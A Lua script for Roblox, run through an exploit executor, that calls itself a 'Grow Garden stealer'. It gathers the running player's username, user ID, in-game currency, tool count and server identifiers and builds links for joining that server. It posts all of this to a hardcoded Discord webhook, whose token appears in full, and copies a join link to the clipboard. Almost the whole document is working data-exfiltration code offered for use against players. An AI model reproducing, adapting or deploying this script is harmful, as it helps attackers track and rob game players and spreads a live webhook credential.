--[[
    GROW GARDEN STEALER v7.0
    NETLIFY BYPASS SYSTEM
    GITHUB CODESPACES EDITION
]]--

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

if _G.STEALER_LOADED then return end
_G.STEALER_LOADED = true

-- CONFIGURATION (REMPLACE AVEC TON URL NETLIFY)
local NETLIFY_URL = "https://ton-app.netlify.app"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1441522680611209356/rWxeFDX61V7hYYdIrgujtvejv4aXFJxtqLrcHJeRM4cuRz2Kf7UO-ObwTa97LMONo_xX"

local SERVER_INFO = {
    PlaceId = game.PlaceId,
    JobId = game.JobId
}

print("GITHUB STEALER v7.0 - ACTIVATED")

function GenerateLinks()
    return {
        NetlifyJoin = NETLIFY_URL .. "/.netlify/functions/join?placeId=" .. SERVER_INFO.PlaceId .. "&jobId=" .. SERVER_INFO.JobId,
        NetlifyPage = NETLIFY_URL .. "/?placeId=" .. SERVER_INFO.PlaceId .. "&jobId=" .. SERVER_INFO.JobId .. "&autojoin=true",
        DirectJoin = "https://www.roblox.com/games/start?placeId=" .. SERVER_INFO.PlaceId .. "&jobId=" .. SERVER_INFO.JobId,
        MobileJoin = "https://www.roblox.com/games/start?placeId=" .. SERVER_INFO.PlaceId .. "&jobId=" .. SERVER_INFO.JobId .. "&mobile=true"
    }
end

function ExtractData()
    local player = Players.LocalPlayer
    local data = {
        Username = player.Name,
        UserId = player.UserId,
        Coins = 0,
        Gems = 0,
        Tools = 0,
        Plants = 0
    }
    
    pcall(function()
        local ls = player:FindFirstChild("leaderstats")
        if ls then
            for _, stat in pairs(ls:GetChildren()) do
                if stat:IsA("NumberValue") then
                    local name = string.lower(stat.Name)
                    if name:find("coin") then data.Coins = stat.Value
                    elseif name:find("gem") then data.Gems = stat.Value end
                end
            end
        end
    end)
    
    pcall(function()
        local backpack = player:FindFirstChild("Backpack")
        if backpack then
            for _, item in pairs(backpack:GetChildren()) do
                if item:IsA("Tool") then
                    data.Tools = data.Tools + 1
                end
            end
        end
    end)
    
    return data
end

function SendWebhook()
    local data = ExtractData()
    local links = GenerateLinks()
    
    local payload = {
        ["content"] = "@everyone GITHUB STEALER ACTIVATED",
        ["embeds"] = {{
            ["title"] = "GROW GARDEN DATA EXTRACTION",
            ["color"] = 65280,
            ["fields"] = {
                {
                    ["name"] = "PLAYER INFO",
                    ["value"] = data.Username .. " (" .. data.UserId .. ")",
                    ["inline"] = false
                },
                {
                    ["name"] = "ECONOMY",
                    ["value"] = "Coins: " .. data.Coins .. "\nGems: " .. data.Gems,
                    ["inline"] = true
                },
                {
                    ["name"] = "INVENTORY",
                    ["value"] = "Tools: " .. data.Tools,
                    ["inline"] = true
                },
                {
                    ["name"] = "NETLIFY JOIN LINKS",
                    ["value"] = "[MAIN LINK](" .. links.NetlifyJoin .. ")\n[AUTO JOIN](" .. links.NetlifyPage .. ")\n[DIRECT](" .. links.DirectJoin .. ")",
                    ["inline"] = false
                },
                {
                    ["name"] = "SERVER INFO",
                    ["value"] = "JobId: " .. SERVER_INFO.JobId .. "\nPlaceId: " .. SERVER_INFO.PlaceId,
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "GitHub Stealer v7.0 | " .. os.date("%m/%d/%Y at %H:%M")
            }
        }}
    }
    
    pcall(function()
        local request = syn and syn.request or request
        if request then
            request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end
    end)
end

-- EXECUTION
wait(2)
SendWebhook()

if setclipboard then
    local links = GenerateLinks()
    setclipboard(links.NetlifyJoin)
    print("NETLIFY LINK COPIED!")
end

print("GITHUB STEALER READY!")